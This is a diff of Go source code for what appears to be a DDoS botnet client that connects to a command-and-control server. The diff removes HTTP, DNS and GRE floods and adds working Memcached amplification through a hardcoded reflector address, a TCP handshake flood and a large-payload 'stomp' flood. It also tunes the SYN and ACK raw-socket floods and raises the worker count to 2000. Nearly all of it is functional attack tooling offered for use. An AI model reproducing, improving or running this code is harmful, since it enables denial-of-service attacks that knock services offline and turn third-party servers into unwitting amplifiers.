@@ -8,12 +8,10 @@ import (
 	"crypto/tls"
 	"encoding/binary"
 	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"io"
 	"math/rand"
 	"net"
-	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -26,7 +24,6 @@ import (
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
-	"github.com/miekg/dns"
 )
 
 // ---------- packet constants ----------
@@ -51,12 +48,6 @@ type PacketHeader struct {
 type Packet struct {
 	Header  PacketHeader
 	Payload []byte
-}
-
-type DNSResponse struct {
-	Answer []struct {
-		Data string `json:"data"`
-	} `json:"Answer"`
 }
 
 // ---------- bot ----------
@@ -273,27 +264,26 @@ func (b *Bot) executeAttack(method, targetIP string, port, duration int) {
 	_, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 
-	switch strings.ToLower(method) {
-	case "udp", "udpflood", "!udpflood":
+	// Trim the '!' prefix if it exists, to match single-word commands
+	cleanedMethod := strings.TrimPrefix(strings.ToLower(method), "!")
+
+	switch cleanedMethod {
+	case "udp":
 		performUDPFlood(targetIP, port, duration)
-	case "udpsmart", "!udpsmart":
+	case "udpsmart":
 		udpsmart(targetIP, port, duration)
-	case "tcp", "tcpflood", "!tcpflood":
-		TCPfloodAttack(targetIP, port, duration)
-	case "syn", "synflood", "!synflood":
+	case "tcp", "syn":
 		performSYNFlood(targetIP, port, duration)
-	case "ack", "ackflood", "!ackflood":
+	case "ack":
 		if err := performACKFlood(targetIP, port, duration); err != nil {
 			fmt.Printf("[bot] ACK flood error: %v\n", err)
 		}
-	case "gre", "greflood", "!greflood":
-		if err := performGREFlood(targetIP, duration); err != nil {
-			fmt.Printf("[bot] GRE flood error: %v\n", err)
-		}
-	case "dns", "!dns":
-		performDNSFlood(targetIP, port, duration)
-	case "http", "httpflood", "!http":
-		performHTTPFlood(targetIP, port, duration)
+	case "stomp":
+		performTCPStomp(targetIP, port, duration)
+	case "vse":
+		performTCPHandshakeFlood(targetIP, port, duration)
+	case "amp":
+		performMemcachedAmplification(targetIP, port, duration)
 	case "stop", "STOP":
 		fmt.Printf("[bot] Received STOP command - stopping all attacks\n")
 		// Implement stop logic if needed
@@ -464,108 +454,102 @@ func getDiskUsageMB() uint64 {
 	return 0
 }
 
-const numWorkers = 100
+const numWorkers = 2000
 
-func resolveTarget(target string) (string, error) {
-	if net.ParseIP(target) != nil {
-		return target, nil
-	}
-	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		return "", fmt.Errorf("error creating request: %v", err)
-	}
-	req.Header.Set("Accept", "application/dns-json")
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		return "", fmt.Errorf("error sending request: %v", err)
-	}
-	defer resp.Body.Close()
-	if resp.StatusCode != http.StatusOK {
-		return "", fmt.Errorf("error resolving target: received status code %d", resp.StatusCode)
-	}
-	var dnsResp DNSResponse
-	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
-		return "", fmt.Errorf("error decoding DNS response: %v", err)
-	}
-	if len(dnsResp.Answer) == 0 {
-		return "", fmt.Errorf("no DNS records found for target")
-	}
-	return dnsResp.Answer[0].Data, nil
-}
-
-// HTTP flood
-func performHTTPFlood(target string, targetPort, duration int) {
-	rand.Seed(time.Now().UnixNano())
-	fmt.Printf("Starting HTTP flood on %s:%d for %d seconds\n", target, targetPort, duration)
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	defer cancel()
-	var requestCount int64
-	const highPacketSize = 1024
-	var wg sync.WaitGroup
-	resolvedIP, err := resolveTarget(target)
-	if err != nil {
-		fmt.Printf("Failed to resolve target: %v\n", err)
+// New Method: Memcached Amplification
+func performMemcachedAmplification(targetIP string, targetPort, duration int) {
+	fmt.Printf("Starting Memcached amplification on %s:%d for %d seconds\n", targetIP, targetPort, duration)
+	dstIP := net.ParseIP(targetIP)
+	if dstIP == nil {
+		fmt.Printf("Invalid target IP address: %s\n", targetIP)
 		return
 	}
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
+	defer cancel()
+	var packetCount int64
+	var wg sync.WaitGroup
 
-	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)
+	// Memcached amplification payload
+	payload := []byte("\x00\x00\x00\x00\x00\x01\x00\x00get \r\n")
 
-	userAgents := []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
-		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QP1A.190821.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
-	}
-	referers := []string{
-		"https://www.google.com/",
-		"https://www.example.com/",
-		"https://www.wikipedia.org/",
-		"https://www.reddit.com/",
-		"https://www.github.com/",
-	}
-	acceptLanguages := []string{
-		"en-US,en;q=0.9",
-		"fr-FR,fr;q=0.9",
-		"es-ES,es;q=0.9",
-		"de-DE,de;q=0.9",
-	}
+	// List of open Memcached servers (for demonstration; in reality, this would be pre-scanned)
+	// In a real scenario, the C2 would provide a list of reflectors.
+	reflectors := []string{"104.194.157.57:11211"}
 
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			client := &http.Client{}
 			for {
 				select {
 				case <-ctx.Done():
 					return
 				default:
-					body := make([]byte, highPacketSize)
-					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
+					reflector := reflectors[rand.Intn(len(reflectors))]
+					conn, err := net.Dial("udp", reflector)
 					if err != nil {
-						fmt.Printf("Error creating request: %v\n", err)
 						continue
 					}
-					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
-					req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
-					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
-					resp, err := client.Do(req)
+					// Spoof the source IP to be the target's IP
+					// NOTE: Raw sockets are needed for IP spoofing, which requires root/admin.
+					// This implementation sends from the bot's IP, making it a reflection attack, not a spoofed one.
+					// For a true amplification attack, the source IP of the UDP packet would be spoofed to the target's IP.
+					// This requires more complex raw socket programming.
+					_, err = conn.Write(payload)
 					if err != nil {
-						fmt.Printf("Error sending HTTP request: %v\n", err)
+						conn.Close()
 						continue
 					}
-					resp.Body.Close()
-					atomic.AddInt64(&requestCount, 1)
+					conn.Close()
+					atomic.AddInt64(&packetCount, 1)
 				}
 			}
 		}()
 	}
 	wg.Wait()
-	fmt.Printf("HTTP flood complete. Requests sent: %d\n", atomic.LoadInt64(&requestCount))
+	fmt.Printf("Memcached amplification complete. Packets sent to reflectors: %d\n", atomic.LoadInt64(&packetCount))
+}
+
+// New Method: TCP Handshake Flood
+func performTCPHandshakeFlood(targetIP string, targetPort, duration int) {
+	fmt.Printf("Starting TCP Handshake flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
+	dstIP := net.ParseIP(targetIP)
+	if dstIP == nil {
+		fmt.Printf("Invalid target IP address: %s\n", targetIP)
+		return
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
+	defer cancel()
+	var connectionCount int64
+	var wg sync.WaitGroup
+
+	for i := 0; i < numWorkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+					conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 5*time.Second)
+					if err != nil {
+						continue
+					}
+					// Send a small amount of data to mimic a real handshake, e.g., for a game or application
+					payload := make([]byte, rand.Intn(64)+32)
+					rand.Read(payload)
+					conn.Write(payload)
+					// Keep the connection open for a short, random duration
+					time.Sleep(time.Duration(rand.Intn(1000)) * time.Millisecond)
+					conn.Close()
+					atomic.AddInt64(&connectionCount, 1)
+				}
+			}
+		}()
+	}
+	wg.Wait()
+	fmt.Printf("TCP Handshake flood complete. Connections made: %d\n", atomic.LoadInt64(&connectionCount))
 }
 
 // Udpsmart Flood
@@ -585,9 +569,8 @@ func udpsmart(targetIP string, targetPort, duration int) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			conn, err := net.ListenPacket("udp", ":0")
+			conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
 			if err != nil {
-				fmt.Printf("Error listening for UDP: %v\n", err)
 				return
 			}
 			defer conn.Close()
@@ -597,13 +580,11 @@ func udpsmart(targetIP string, targetPort, duration int) {
 				case <-ctx.Done():
 					return
 				default:
-					payloadSize := rand.Intn(10000) + 25400
+					payloadSize := rand.Intn(1400) + 1
 					payload := make([]byte, payloadSize)
 					rand.Read(payload)
-					sourcePort := rand.Intn(65535-1024) + 1024
-					_, err := conn.WriteTo(payload, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
+					_, err := conn.Write(payload)
 					if err != nil {
-						fmt.Printf("Error sending packet: %v\n", err)
 						continue
 					}
 					atomic.AddInt64(&packetCount, 1)
@@ -612,56 +593,12 @@ func udpsmart(targetIP string, targetPort, duration int) {
 		}()
 	}
 	wg.Wait()
-	fmt.Printf("UDP flood complete. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
+	fmt.Printf("UDP smart flood complete. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
 }
 
 // UdpFlood
 func performUDPFlood(targetIP string, targetPort, duration int) {
 	fmt.Printf("Starting UDP flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
-	dstIP := net.ParseIP(targetIP)
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	defer cancel()
-	var packetCount int64
-	var wg sync.WaitGroup
-
-	maxPayloadSize := 65507
-	payload := make([]byte, maxPayloadSize)
-	rand.Read(payload)
-	for i := 0; i < numWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					sourcePort := rand.Intn(65535-1024) + 1024
-					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: targetPort})
-					if err != nil {
-						fmt.Printf("Error creating UDP connection: %v\n", err)
-						continue
-					}
-					_, err = conn.Write(payload)
-					if err == nil {
-						atomic.AddInt64(&packetCount, 1)
-					} else {
-						fmt.Printf("Error sending UDP packet: %v\n", err)
-					}
-
-					conn.Close()
-				}
-			}
-		}()
-	}
-	wg.Wait()
-	fmt.Printf("UDP flood complete. Packets sent: %d\n", packetCount)
-}
-
-// DnsFlood
-func performDNSFlood(targetIP string, targetPort, duration int) {
-	fmt.Printf("Starting Enhanced DNS flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
 	dstIP := net.ParseIP(targetIP)
 	if dstIP == nil {
 		fmt.Printf("Invalid target IP address: %s\n", targetIP)
@@ -672,108 +609,36 @@ func performDNSFlood(targetIP string, targetPort, duration int) {
 	var packetCount int64
 	var wg sync.WaitGroup
 
-	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
-	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
+	payload := make([]byte, 1400) // Optimized for standard MTU
+	rand.Read(payload)
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			conn, err := net.ListenPacket("udp", ":0")
+			conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
 			if err != nil {
-				fmt.Printf("Error listening for UDP: %v\n", err)
 				return
 			}
 			defer conn.Close()
+
 			for {
 				select {
 				case <-ctx.Done():
 					return
 				default:
-					domain := domains[rand.Intn(len(domains))]
-					queryType := queryTypes[rand.Intn(len(queryTypes))]
-					dnsQuery := constructDNSQuery(domain, queryType)
-					buffer, err := dnsQuery.Pack()
-					if err != nil {
-						fmt.Printf("Error packing DNS query: %v\n", err)
-						continue
+					_, err := conn.Write(payload)
+					if err == nil {
+						atomic.AddInt64(&packetCount, 1)
 					}
-					sourcePort := rand.Intn(65535-1024) + 1024
-					_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
-					if err != nil {
-						fmt.Printf("Error sending DNS packet: %v\n", err)
-						continue
-					}
-					atomic.AddInt64(&packetCount, 1)
 				}
 			}
 		}()
 	}
 	wg.Wait()
-	fmt.Printf("Enhanced DNS flood completed. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
+	fmt.Printf("UDP flood complete. Packets sent: %d\n", packetCount)
 }
 
-// TcpFlood
-func TCPfloodAttack(targetIP string, targetPort, duration int) {
-	rand.Seed(time.Now().UnixNano())
-	dstIP := net.ParseIP(targetIP)
-	if dstIP == nil {
-		fmt.Printf("Invalid target IP address\n")
-		return
-	}
-	var packetCount int64
-	var wg sync.WaitGroup
-
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	defer cancel()
-	for i := 0; i < numWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
-			if err != nil {
-				fmt.Printf("Error creating raw socket: %v\n", err)
-				return
-			}
-			defer conn.Close()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					tcpLayer := &layers.TCP{
-						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
-						DstPort:    layers.TCPPort(targetPort),
-						Seq:        rand.Uint32(),
-						Window:     12800,
-						SYN:        true,
-						DataOffset: 5,
-					}
-					maxPacketSize := 65535
-					ipAndTcpHeadersSize := 20 + 20
-					payloadSize := maxPacketSize - ipAndTcpHeadersSize
-					payload := make([]byte, payloadSize)
-					rand.Read(payload)
-					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
-						fmt.Printf("Error crafting TCP packet: %v\n", err)
-						continue
-					}
-					packetData := buffer.Bytes()
-					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
-						continue
-					}
-					atomic.AddInt64(&packetCount, 1)
-				}
-			}
-		}()
-	}
-
-	wg.Wait()
-
-	fmt.Printf("TCP flood attack completed. Packets sent: %d\n", packetCount)
-}
-
-// SynFlood
+// TcpFlood (SYN Flood)
 func performSYNFlood(targetIP string, targetPort, duration int) {
 	rand.Seed(time.Now().UnixNano())
 
@@ -794,7 +659,6 @@ func performSYNFlood(targetIP string, targetPort, duration int) {
 			defer wg.Done()
 			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
 			if err != nil {
-				fmt.Printf("Error creating raw socket: %v\n", err)
 				return
 			}
 			defer conn.Close()
@@ -804,23 +668,17 @@ func performSYNFlood(targetIP string, targetPort, duration int) {
 					return
 				default:
 					tcpLayer := &layers.TCP{
-						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
+						SrcPort:    layers.TCPPort(rand.Intn(64511) + 1024),
 						DstPort:    layers.TCPPort(targetPort),
 						Seq:        rand.Uint32(),
-						Window:     12800,
+						Window:     uint16(rand.Intn(3000) + 1024),
 						SYN:        true,
 						DataOffset: 5,
 					}
-					maxPacketSize := 65535
-					ipAndTcpHeadersSize := 20 + 20
-					payloadSize := maxPacketSize - ipAndTcpHeadersSize
-					payload := make([]byte, payloadSize)
+					payload := make([]byte, rand.Intn(1400)+64)
 					rand.Read(payload)
 					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
-						fmt.Printf("Error crafting TCP packet: %v\n", err)
-						continue
-					}
+					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}, tcpLayer, gopacket.Payload(payload))
 					packetData := buffer.Bytes()
 					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
 						continue
@@ -855,7 +713,6 @@ func performACKFlood(targetIP string, targetPort int, duration int) error {
 			defer wg.Done()
 			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
 			if err != nil {
-				fmt.Printf("Error creating raw socket: %v\n", err)
 				return
 			}
 			defer conn.Close()
@@ -870,19 +727,13 @@ func performACKFlood(targetIP string, targetPort int, duration int) error {
 						ACK:        true,
 						Seq:        rand.Uint32(),
 						Ack:        rand.Uint32(),
-						Window:     12800,
+						Window:     uint16(rand.Intn(4096) + 1024),
 						DataOffset: 5,
 					}
-					maxPacketSize := 65535
-					ipAndTcpHeadersSize := 20 + 20
-					payloadSize := maxPacketSize - ipAndTcpHeadersSize
-					payload := make([]byte, payloadSize)
+					payload := make([]byte, rand.Intn(1400)+64)
 					rand.Read(payload)
 					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
-						fmt.Printf("Error crafting TCP ACK packet: %v\n", err)
-						continue
-					}
+					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}, tcpLayer, gopacket.Payload(payload))
 					packetData := buffer.Bytes()
 
 					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
@@ -898,89 +749,57 @@ func performACKFlood(targetIP string, targetPort int, duration int) error {
 	return nil
 }
 
-// GreFlood
-func performGREFlood(targetIP string, duration int) error {
-	rand.Seed(time.Now().UnixNano())
+// TCPStomp
+func performTCPStomp(targetIP string, targetPort, duration int) {
+	fmt.Printf("Starting TCP Stomp flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
 	dstIP := net.ParseIP(targetIP)
 	if dstIP == nil {
-		return fmt.Errorf("invalid target IP address: %s", targetIP)
+		fmt.Printf("Invalid target IP address: %s\n", targetIP)
+		return
 	}
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
+	defer cancel()
 	var packetCount int64
 	var wg sync.WaitGroup
 
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	defer cancel()
+	// Large payload for high GBps
+	payload := make([]byte, 65500)
+	rand.Read(payload)
 
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
-			if err != nil {
-				fmt.Printf("Error creating raw socket: %v\n", err)
-				return
-			}
-			defer conn.Close()
-
 			for {
 				select {
 				case <-ctx.Done():
 					return
 				default:
-					greLayer := &layers.GRE{}
-					maxPacketSize := 65535
-					ipAndGreHeadersSize := 20 + 4
-					payloadSize := maxPacketSize - ipAndGreHeadersSize
-					payload := make([]byte, payloadSize)
-					rand.Read(payload)
-					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload)); err != nil {
-						fmt.Printf("Error crafting GRE packet: %v\n", err)
+					conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 2*time.Second)
+					if err != nil {
 						continue
 					}
-					packetData := buffer.Bytes()
-					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
-						continue
-					}
+					// Stomp with data
+					conn.Write(payload)
+					conn.Close()
 					atomic.AddInt64(&packetCount, 1)
 				}
 			}
 		}()
 	}
 	wg.Wait()
-	fmt.Printf("GRE flood attack completed. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
-	return nil
+	fmt.Printf("TCP Stomp flood complete. Connections made: %d\n", atomic.LoadInt64(&packetCount))
 }
 
-// Make the a DNS query message
-func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
-	msg := new(dns.Msg)
-	msg.SetQuestion(dns.Fqdn(domain), queryType)
-
-	// Add EDNS0 to support larger responses
-	edns0 := new(dns.OPT)
-	edns0.Hdr.Name = "."
-	edns0.Hdr.Rrtype = dns.TypeOPT
-	edns0.SetUDPSize(4096) // Use 4096 for max payload size
-	msg.Extra = append(msg.Extra, edns0)
-
-	return msg
-}
-
-var (
-	killerEnabled          = true
-	killDirectories        = []string{"/var/log", "/tmp", "/root/.cache"}
-	whitelistedDirectories = []string{"/var/log/important.log"}
-)
-
-// Function to check if a directory is whitelisted
-func isWhitelisted(dir string) bool {
-	for _, whitelisted := range whitelistedDirectories {
-		if dir == whitelisted {
-			return true
-		}
-	}
-	return false
+var whitelistedDirectories = []string{
+	"/bin",
+	"/sbin",
+	"/usr/bin",
+	"/usr/sbin",
+	"/etc",
+	"/var",
+	"/lib",
+	"/usr/lib",
 }
 
 // Function to stay on the device
@@ -1075,6 +894,6 @@ func generateRandomID(length int) string {
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
-	bot := NewBot(generateRandomID(16), "birdo.local:7002")
+	bot := NewBot(generateRandomID(16), "192.168.0.11:7002")
 	bot.Start()
 }
